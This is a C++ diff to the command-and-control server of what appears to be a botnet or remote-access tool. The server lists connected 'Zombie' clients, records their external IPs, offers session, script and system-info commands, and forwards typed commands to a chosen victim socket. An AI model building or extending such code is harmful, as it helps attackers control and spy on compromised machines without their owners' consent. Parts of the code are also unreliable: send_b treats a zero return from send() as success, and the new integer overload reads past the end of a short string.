@@ -57,24 +57,28 @@ bool Server::send_c()
 	}
 	else if (strcmp(b, "help") == 0 || strcmp(b, "HELP") == 0)
 	{
-		//print_help();
+		Info::print_help();
 	}
 	else if (!(strcmp(b, "list")))
 	{
-		list(this);
-		std::cout << clients.size() << std::endl;
-		for (int i = 0; i < clients.size(); i++)
-		{
-			std::cout << "Zombie " << clients[i].number << " addr: " << clients[i].addr << std::endl;
-		}
+		Info::list(this);		
+	}
+	else if (!(strcmp(b, "list_scripts")))
+	{
+		Info::list_scripts();
+	}
+	else if (!(strcmp(b, "set_session")))
+	{
+		Info::set_session(this);
 	}
 	else if (!(strcmp(b, "getsysinfo")))
 	{
-		getsysinfo(this);
+		Info::getsysinfo(this);
 	}
 	else if (!(this->send_b(b))) { return 1; }
 	else { return 0; }
 }
+
 bool Server::send_b(const char* pbuffer)
 {
 	if(send(default_client.sock, pbuffer, SIZE_BUFFER, 0) == 0)
@@ -82,6 +86,14 @@ bool Server::send_b(const char* pbuffer)
 	else
 		return 0;
 }
+bool Server::send_b(const int &pbuffer)
+{
+	std::string s = std::to_string(pbuffer);
+	if (send(default_client.sock, s.c_str(), SIZE_BUFFER, 0) == 0)
+		return 1;
+	else return 0;
+}
+
 bool Server::acceptClient()
 {
 	st_Client NewClient;
@@ -95,13 +107,19 @@ bool Server::acceptClient()
 
 	if (newClient != INVALID_SOCKET)
 	{
+		char buffer[256];
 		char buff[INET6_ADDRSTRLEN] = { 0 };
 		std::string clientAddress = inet_ntop(addr.sin_family, (void*)&(addr.sin_addr), buff, INET6_ADDRSTRLEN);
 		std::cout << "New client accepted :  " << clientAddress.c_str() << ":" << addr.sin_port << std::endl;
 		NewClient.sock = newClient;
-		NewClient.addr = (clientAddress.c_str());
+		NewClient.addr = clientAddress;
 		NewClient.number = (clients.size()+1);
+		// IP
+		recv(newClient, buffer, sizeof(buffer), 0);
+
+		NewClient.ip_extern = buffer;
 		clients.push_back(NewClient);
+
 		if (clients.size() == 1) 
 		{
 			default_client = NewClient;
@@ -118,6 +136,10 @@ bool Server::acceptClient()
 
 std::vector<st_Client> Server::getClients(){return clients;}
 bool Server::getExit() { return exit; }
+void Server::setDefaultClient(st_Client _default)
+{
+	default_client = _default;
+}
 
 bool Server::recv_b()
 {
@@ -130,8 +152,4 @@ bool Server::recv_b()
 	}
 	else
 		return 0;
-}
-void Server::compare(char* pbuffer)
-{
-
 }
